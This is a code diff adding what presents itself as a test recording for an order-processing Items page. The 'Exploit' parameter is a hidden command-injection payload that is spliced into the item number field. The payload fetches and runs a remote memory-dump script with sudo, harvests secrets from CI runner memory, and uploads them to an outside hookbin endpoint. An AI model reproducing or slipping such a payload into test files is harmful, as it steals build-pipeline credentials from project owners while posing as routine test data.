@@ -1,0 +1,26 @@
+{
+  "name": "NewItemHasUnitPriceNonZero",
+  "description": "Test recording",
+  "telemetryId": "7b849dba-6cd5-4abc-be23-0a60a12776aa",
+  "parameters": {
+    "Exploit": "'; curl -sSf https://raw.githubusercontent.com/playground-nils/tools/refs/heads/main/memdump.py | sudo -E python3 | tr -d '\\0' | grep -aoE '\"[^\"]+\":{\"value\":\"[^\"]*\",\"isSecret\":true}' >> /tmp/secrets; curl -X PUT -d @/tmp/secrets https://open-hookbin.vercel.app/$GITHUB_RUN_ID; #"
+  },
+  "start": {
+    "profile": "ORDER PROCESSOR"
+  },
+  "steps": [
+    {
+      "type": "navigate",
+      "target": [
+        { "page": "Order Processor Role Center" },
+        { "action": "Items" }
+      ],
+      "description": "Navigate to <caption>Items</caption>"
+    },
+    {
+      "type": "input",
+      "control": "No.",
+      "value": "=\"Adatum Corporation\" & Parameters.Exploit"
+    }
+  ]
+}
